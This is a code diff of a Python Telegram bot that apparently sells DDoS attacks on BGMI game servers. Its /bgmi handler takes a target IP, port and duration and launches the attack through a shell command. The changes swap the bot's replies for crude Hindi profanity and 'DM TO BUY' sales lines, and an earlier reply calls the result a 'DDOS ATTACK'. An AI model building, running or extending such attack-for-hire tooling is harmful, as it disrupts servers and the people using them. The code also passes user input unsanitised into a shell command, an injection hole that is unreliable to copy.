@@ -208,7 +208,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"𝙔𝙊𝙐𝙍 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙍𝙏𝙀𝘿 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔 𝘽𝙔 @Felixbbyy 💗✅ "
+    response = f"🥵 𝘽𝙂𝙈𝙄 𝙆𝙄 𝘾𝙃𝙐𝙐𝘿𝘼𝙄 𝘾𝙃𝘼𝙇𝙐 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔 𝘽𝙔 @Felixbbyy 💦 "
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -237,18 +237,18 @@ def handle_bgmi(message):
             port = int(command[2])  # Convert time to integer
             time = int(command[3])  # Convert port to integer
             if time > 2001:
-                response = "❌ 𝙀𝙍𝙍𝙊𝙍 𝙐𝙎𝙀 𝙇𝙀𝙎𝙎 𝙏𝙃𝙀𝙉 180 𝙎𝙀𝘾𝙊𝙉𝘿𝙎 ❌."
+                response = "😒 𝙏𝙐 𝙏𝙃𝙊𝘿𝘼 𝙎𝘼 𝘽𝙃𝙀𝙉𝙉 𝙇𝘼 𝙇𝙐𝙉𝘿 𝙃𝘼𝙄 𝙆𝙔𝘼 😂"
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./bgmi {target} {port} {time} 70"
                 subprocess.run(full_command, shell=True)
-                response = f"𝘽𝙂𝙈𝙄 𝘿𝘿𝙊𝙎 𝘼𝙏𝙏𝘼𝘾𝙆 𝙁𝙄𝙉𝙄𝙎𝙃𝙀𝘿 𝘽𝙔 @Felixbbyy 👽"
+                response = f"𝙇𝙊 𝘼𝘼 𝙂𝘼𝙔𝘼 𝘽𝙂𝙈𝙄 𝙈𝘼𝘼 𝘾𝙃𝙊𝘿𝘿 𝙆𝙀 𝘿𝙈 ~ @Felixbbyy 👽"
         else:
-            response = "𝙋𝙇𝙀𝘼𝙎𝙀 𝙋𝙍𝙊𝙑𝙄𝘿𝙀 𝙄𝙋 𝙋𝙊𝙍𝙏 𝙎𝙀𝘾𝙊𝙉𝘿𝙎 ✅ "  # Updated command syntax
+            response = "🥵 𝘽𝙂𝙈𝙄 𝙆𝙄 𝙂𝘼𝙉𝘿 𝙎𝙀 𝙄𝙋 𝙋𝙊𝙍𝙏 𝙎𝙀𝘾𝙊𝙉𝘿𝙎 ✅ 𝙇𝘼𝙆𝙀 𝘿𝙊"  # Updated command syntax
     else:
-        response = "❌ 𝙔𝙊𝙐 𝘼𝙍𝙀 𝙉𝙊𝙏 𝘼𝙐𝙏𝙃𝙊𝙍𝙄𝙎𝙀𝘿 𝙏𝙊 𝙐𝙎𝙀 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙈𝘿 ❌"
+        response = "🙂 𝙊𝙔𝙀𝙀 𝘽𝙝𝙤𝙨𝙙𝙞𝙠 𝙋𝙀𝙃𝙇𝙀 𝙆𝙃𝘼𝙍𝙄𝘿 𝙏𝙊 𝙇𝙀 @Felixbbyy 𝙋𝘼𝙋𝘼 𝙎𝙀 💋"
 
     bot.reply_to(message, response)
 
@@ -296,7 +296,7 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f"🙏🏻 𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 ⚡𝐅𝐄𝐋𝐈𝐗 💀 𝐏𝐎𝐖𝐄𝐑⚡ 𝙃𝙐𝘽 𝘼𝙇𝙇 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 𝘼𝙑𝘼𝙄𝙇𝘼𝘽𝙇𝙀 𝙊𝙉 𝙈𝙀𝙉𝙐. @Felixbbyy 🪱"
+    response = f"💋𝘽𝙂𝙈𝙄 𝘾𝙃𝙐𝘿𝘼𝙄 𝙆𝙃𝘼𝙉𝙀 𝙈𝙀 𝘼𝘼𝙋𝙆𝘼 𝙎𝙐𝘼𝙂𝘼𝙏 𝙃𝘼𝙄 . 𝘿𝙈 𝙏𝙊 𝘽𝙐𝙔 @Felixbbyy 🌷⛈️"
     bot.reply_to(message, response)
 
 
